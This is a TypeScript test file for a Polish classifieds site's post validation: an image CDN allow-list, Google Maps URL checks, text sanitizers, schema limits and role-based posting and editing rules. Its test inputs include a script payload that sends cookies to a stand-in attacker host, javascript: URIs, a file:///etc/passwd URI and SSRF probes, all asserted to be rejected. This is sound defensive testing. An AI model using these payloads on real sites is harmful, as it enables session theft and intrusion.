/**
 * tests/post-validation.test.ts
 *
 * Functional + security tests for post-related schemas and utilities:
 * - createPostSchema / updatePostSchema (inline copies of the schema to avoid
 *   importing route-level code that references next/server).
 * - isAllowedImageUrl (CDN allow-list)
 * - sanitizeSingleLine / sanitizeMultiline (content sanitization)
 * - Roles: unauthenticated cannot post, verified user can, edge inputs
 *
 * No DB or HTTP connections.
 */

import test from "node:test";
import assert from "node:assert/strict";
import { z } from "zod";

import { isAllowedImageUrl } from "../src/lib/posts/image-allowlist";
import { canCreateListing, canEditListing } from "../src/lib/posts/policies";
import { sanitizeSingleLine, sanitizeMultiline } from "../src/lib/posts/sanitize";
import { hasEnoughPhoneDigits } from "../src/lib/auth/validators";
import { MAX_PRICE_CENTS } from "../src/lib/posts/price";

// ---------------------------------------------------------------------------
// Inline minimal post schema (mirrors src/app/api/posts/route.ts)
// Uses the same rules but without importing next/server dependencies.
// ---------------------------------------------------------------------------

function isGoogleMapsUrl(url: string): boolean {
  try {
    const { protocol, hostname } = new URL(url);
    if (protocol !== "https:") return false;
    return (
      hostname === "maps.google.com" ||
      hostname === "www.google.com" ||
      hostname === "www.google.pl" ||
      hostname === "maps.app.goo.gl" ||
      hostname === "goo.gl"
    );
  } catch {
    return false;
  }
}

const postSchema = z.object({
  title: z.string().trim().min(5).max(120),
  description: z.string().trim().min(20).max(6000),
  categoryId: z.string().uuid(),
  priceCents: z.number().int().nonnegative().max(MAX_PRICE_CENTS).optional(),
  isNegotiable: z.boolean().optional(),
  contactPhone: z
    .string()
    .trim()
    .min(7)
    .max(40)
    .regex(/^[0-9+\-\s()]{7,40}$/)
    .refine(hasEnoughPhoneDigits)
    .optional(),
  city: z.string().trim().min(2).max(120),
  googleMapsUrl: z.string().url().max(500).refine(isGoogleMapsUrl).optional(),
  lat: z.number().min(-90).max(90).optional(),
  lng: z.number().min(-180).max(180).optional(),
  images: z
    .array(
      z.object({
        url: z.string().url().max(1000).refine(isAllowedImageUrl),
        fileKey: z.string().trim().min(1).max(500),
        mimeType: z.string().trim().max(255).nullable().optional(),
        sizeBytes: z.number().int().nonnegative().nullable().optional(),
      }),
    )
    .max(10)
    .optional(),
});

function validPost() {
  return {
    title: "Używany rower górski Merida",
    description: "Sprzedam rower górski w dobrym stanie, rok 2020, rozmiar ramy L.",
    categoryId: "00000000-0000-4000-a000-000000000001",
    city: "Warszawa",
  };
}

function validImageUrl() {
  return "https://utfs.io/f/abc123def456";
}

// ===========================================================================
// isAllowedImageUrl — CDN allow-list
// ===========================================================================

test("isAllowedImageUrl accepts utfs.io URL", () => {
  assert.equal(isAllowedImageUrl("https://utfs.io/f/abc123"), true);
});

test("isAllowedImageUrl accepts *.ufs.sh subdomain URL", () => {
  assert.equal(isAllowedImageUrl("https://cdn.ufs.sh/file/key"), true);
});

test("isAllowedImageUrl accepts *.uploadthing.com URL", () => {
  assert.equal(isAllowedImageUrl("https://files.uploadthing.com/file/key"), true);
});

test("isAllowedImageUrl rejects http (non-https) URL", () => {
  assert.equal(isAllowedImageUrl("http://utfs.io/f/abc"), false);
});

test("isAllowedImageUrl rejects arbitrary external domain", () => {
  assert.equal(isAllowedImageUrl("https://evil.com/image.jpg"), false);
});

test("isAllowedImageUrl rejects data URI", () => {
  assert.equal(isAllowedImageUrl("data:image/png;base64,AAAA"), false);
});

test("isAllowedImageUrl rejects javascript: URI", () => {
  assert.equal(isAllowedImageUrl("javascript:alert(1)"), false);
});

test("isAllowedImageUrl rejects SSRF candidate (localhost)", () => {
  assert.equal(isAllowedImageUrl("https://localhost/secret"), false);
});

test("isAllowedImageUrl rejects SSRF candidate (internal IP)", () => {
  assert.equal(isAllowedImageUrl("https://192.168.1.1/admin"), false);
});

test("isAllowedImageUrl rejects file:// URI", () => {
  assert.equal(isAllowedImageUrl("file:///etc/passwd"), false);
});

test("isAllowedImageUrl rejects empty string", () => {
  assert.equal(isAllowedImageUrl(""), false);
});

test("isAllowedImageUrl rejects look-alike domain (utfs.io.evil.com)", () => {
  assert.equal(isAllowedImageUrl("https://utfs.io.evil.com/file"), false);
});

// ===========================================================================
// Google Maps URL validation
// ===========================================================================

test("isGoogleMapsUrl accepts maps.google.com", () => {
  assert.equal(isGoogleMapsUrl("https://maps.google.com/maps?q=Warsaw"), true);
});

test("isGoogleMapsUrl accepts maps.app.goo.gl", () => {
  assert.equal(isGoogleMapsUrl("https://maps.app.goo.gl/abc123"), true);
});

test("isGoogleMapsUrl rejects http:// Google Maps URL", () => {
  assert.equal(isGoogleMapsUrl("http://maps.google.com/maps?q=Warsaw"), false);
});

test("isGoogleMapsUrl rejects non-Google URL", () => {
  assert.equal(isGoogleMapsUrl("https://bingmaps.net/maps?q=Warsaw"), false);
});

test("isGoogleMapsUrl rejects SSRF via Google redirect", () => {
  // This relies on hostname check — "www.evil.com" is blocked
  assert.equal(isGoogleMapsUrl("https://www.evil.com/maps?q=Warsaw"), false);
});

// ===========================================================================
// sanitizeSingleLine
// ===========================================================================

test("sanitizeSingleLine strips NUL bytes (removed, not replaced with space)", () => {
  // NUL is in the control-chars range and is deleted, not converted to a space
  assert.equal(sanitizeSingleLine("hello\u0000world"), "helloworld");
});

test("sanitizeSingleLine strips control chars U+0001–U+0008", () => {
  assert.equal(sanitizeSingleLine("a\u0001\u0008b"), "ab");
});

test("sanitizeSingleLine collapses multiple spaces", () => {
  assert.equal(sanitizeSingleLine("hello   world"), "hello world");
});

test("sanitizeSingleLine trims leading/trailing whitespace", () => {
  assert.equal(sanitizeSingleLine("  hello  "), "hello");
});

test("sanitizeSingleLine strips vertical tab (U+000B)", () => {
  assert.equal(sanitizeSingleLine("a\u000Bb"), "ab");
});

test("sanitizeSingleLine strips DEL (U+007F)", () => {
  assert.equal(sanitizeSingleLine("a\u007Fb"), "ab");
});

test("sanitizeSingleLine preserves Polish diacritics", () => {
  const input = "Zał\u0105cznik do sprzeda\u017Cy";
  assert.equal(sanitizeSingleLine(input), input);
});

test("sanitizeSingleLine keeps normal punctuation", () => {
  const input = "Hello, World! @#$%^&*()";
  assert.equal(sanitizeSingleLine(input), input);
});

// ===========================================================================
// sanitizeMultiline
// ===========================================================================

test("sanitizeMultiline normalises CRLF to LF", () => {
  assert.equal(sanitizeMultiline("line1\r\nline2"), "line1\nline2");
});

test("sanitizeMultiline collapses triple newlines", () => {
  assert.equal(sanitizeMultiline("a\n\n\nb"), "a\n\nb");
});

test("sanitizeMultiline preserves double newlines (paragraph breaks)", () => {
  assert.equal(sanitizeMultiline("para1\n\npara2"), "para1\n\npara2");
});

test("sanitizeMultiline strips control chars in multiline content", () => {
  assert.equal(sanitizeMultiline("good\u0000bad\ngood"), "goodbad\ngood");
});

test("sanitizeMultiline trims leading/trailing whitespace", () => {
  assert.equal(sanitizeMultiline("\n\ntext\n\n"), "text");
});

// ===========================================================================
// Post schema — valid cases
// ===========================================================================

test("postSchema parses minimal valid post", () => {
  const result = postSchema.safeParse(validPost());
  assert.equal(result.success, true);
});

test("postSchema parses post with optional images from allowed CDN", () => {
  const result = postSchema.safeParse({
    ...validPost(),
    images: [{ url: validImageUrl(), fileKey: "abc123def456" }],
  });
  assert.equal(result.success, true);
});

test("postSchema parses post with valid coordinates", () => {
  const result = postSchema.safeParse({ ...validPost(), lat: 52.2297, lng: 21.0122 });
  assert.equal(result.success, true);
});

// ===========================================================================
// Post schema — title validation
// ===========================================================================

test("postSchema rejects title shorter than 5 chars", () => {
  const result = postSchema.safeParse({ ...validPost(), title: "Hi" });
  assert.equal(result.success, false);
});

test("postSchema rejects title longer than 120 chars", () => {
  const result = postSchema.safeParse({ ...validPost(), title: "A".repeat(121) });
  assert.equal(result.success, false);
});

test("postSchema rejects XSS in title via length (>120)", () => {
  const xss = "<script>fetch('https://attacker.com/?c='+document.cookie)</script>".padEnd(121, "x");
  const result = postSchema.safeParse({ ...validPost(), title: xss });
  assert.equal(result.success, false);
});

test("postSchema trims whitespace-only title to empty string → rejected", () => {
  const result = postSchema.safeParse({ ...validPost(), title: "     " });
  assert.equal(result.success, false);
});

// ===========================================================================
// Post schema — description
// ===========================================================================

test("postSchema rejects description shorter than 20 chars", () => {
  const result = postSchema.safeParse({ ...validPost(), description: "Too short." });
  assert.equal(result.success, false);
});

test("postSchema rejects description longer than 6000 chars", () => {
  const result = postSchema.safeParse({ ...validPost(), description: "A".repeat(6001) });
  assert.equal(result.success, false);
});

// ===========================================================================
// Post schema — price
// ===========================================================================

test("postSchema rejects negative price", () => {
  const result = postSchema.safeParse({ ...validPost(), priceCents: -1 });
  assert.equal(result.success, false);
});

test("postSchema rejects price over MAX_PRICE_CENTS", () => {
  const result = postSchema.safeParse({ ...validPost(), priceCents: MAX_PRICE_CENTS + 1 });
  assert.equal(result.success, false);
});

test("postSchema rejects non-integer price", () => {
  const result = postSchema.safeParse({ ...validPost(), priceCents: 1.5 });
  assert.equal(result.success, false);
});

test("postSchema accepts price = 0 (free listing)", () => {
  const result = postSchema.safeParse({ ...validPost(), priceCents: 0 });
  assert.equal(result.success, true);
});

test("postSchema accepts max price", () => {
  const result = postSchema.safeParse({ ...validPost(), priceCents: MAX_PRICE_CENTS });
  assert.equal(result.success, true);
});

// ===========================================================================
// Post schema — coordinates
// ===========================================================================

test("postSchema rejects lat below -90", () => {
  const result = postSchema.safeParse({ ...validPost(), lat: -90.1, lng: 0 });
  assert.equal(result.success, false);
});

test("postSchema rejects lat above 90", () => {
  const result = postSchema.safeParse({ ...validPost(), lat: 90.1, lng: 0 });
  assert.equal(result.success, false);
});

test("postSchema rejects lng below -180", () => {
  const result = postSchema.safeParse({ ...validPost(), lat: 0, lng: -180.1 });
  assert.equal(result.success, false);
});

test("postSchema rejects lng above 180", () => {
  const result = postSchema.safeParse({ ...validPost(), lat: 0, lng: 180.1 });
  assert.equal(result.success, false);
});

// ===========================================================================
// Post schema — images
// ===========================================================================

test("postSchema rejects more than 10 images", () => {
  const images = Array.from({ length: 11 }, (_, i) => ({
    url: `https://utfs.io/f/image${i}`,
    fileKey: `key${i}`,
  }));
  const result = postSchema.safeParse({ ...validPost(), images });
  assert.equal(result.success, false);
});

test("postSchema rejects image with non-CDN URL", () => {
  const result = postSchema.safeParse({
    ...validPost(),
    images: [{ url: "https://evil.com/image.jpg", fileKey: "abc" }],
  });
  assert.equal(result.success, false);
});

test("postSchema rejects image with http URL even from CDN host", () => {
  const result = postSchema.safeParse({
    ...validPost(),
    images: [{ url: "http://utfs.io/f/image", fileKey: "abc" }],
  });
  assert.equal(result.success, false);
});

test("postSchema rejects image with data URI (XSS vector)", () => {
  const result = postSchema.safeParse({
    ...validPost(),
    images: [{ url: "data:image/svg+xml;base64,PHN2Zy8+", fileKey: "abc" }],
  });
  assert.equal(result.success, false);
});

test("postSchema rejects image with javascript: URI", () => {
  const result = postSchema.safeParse({
    ...validPost(),
    images: [{ url: "javascript:alert(document.cookie)", fileKey: "abc" }],
  });
  assert.equal(result.success, false);
});

// ===========================================================================
// Post schema — phone
// ===========================================================================

test("postSchema rejects contactPhone without 7 digits", () => {
  const result = postSchema.safeParse({ ...validPost(), contactPhone: "+48" });
  assert.equal(result.success, false);
});

test("postSchema rejects contactPhone with letters", () => {
  const result = postSchema.safeParse({ ...validPost(), contactPhone: "twelve-hundred" });
  assert.equal(result.success, false);
});

test("postSchema accepts standard Polish mobile number", () => {
  const result = postSchema.safeParse({ ...validPost(), contactPhone: "+48 600 700 800" });
  assert.equal(result.success, true);
});

// ===========================================================================
// Post schema — city
// ===========================================================================

test("postSchema rejects city shorter than 2 chars", () => {
  const result = postSchema.safeParse({ ...validPost(), city: "A" });
  assert.equal(result.success, false);
});

test("postSchema rejects city longer than 120 chars", () => {
  const result = postSchema.safeParse({ ...validPost(), city: "W".repeat(121) });
  assert.equal(result.success, false);
});

// ===========================================================================
// Role-based access — simulated guard logic
// ===========================================================================

test("canCreatePost: unauthenticated user cannot post", () => {
  assert.equal(canCreateListing(null), false);
});

test("canCreatePost: active + verified user can post", () => {
  assert.equal(canCreateListing({ id: "u1", role: "USER", status: "ACTIVE", email_verified_at: new Date() }), true);
});

test("canCreatePost: INACTIVE user cannot post", () => {
  assert.equal(canCreateListing({ id: "u1", role: "USER", status: "INACTIVE", email_verified_at: new Date() }), false);
});

test("canCreatePost: BANNED user cannot post", () => {
  assert.equal(canCreateListing({ id: "u1", role: "USER", status: "BANNED", email_verified_at: new Date() }), false);
});

test("canCreatePost: unverified email cannot post", () => {
  assert.equal(canCreateListing({ id: "u1", role: "USER", status: "ACTIVE", email_verified_at: null }), false);
});

test("canEditPost: owner can edit their own post", () => {
  assert.equal(canEditListing("user-1", { id: "user-1", role: "USER" }), true);
});

test("canEditPost: non-owner USER cannot edit someone else's post", () => {
  assert.equal(canEditListing("user-1", { id: "user-2", role: "USER" }), false);
});

test("canEditPost: ADMIN can edit any post", () => {
  assert.equal(canEditListing("user-1", { id: "admin-1", role: "ADMIN" }), true);
});

test("canEditPost: MODERATOR can edit any post", () => {
  assert.equal(canEditListing("user-1", { id: "mod-1", role: "MODERATOR" }), true);
});

test("canEditPost: unauthenticated cannot edit", () => {
  assert.equal(canEditListing("user-1", null), false);
});
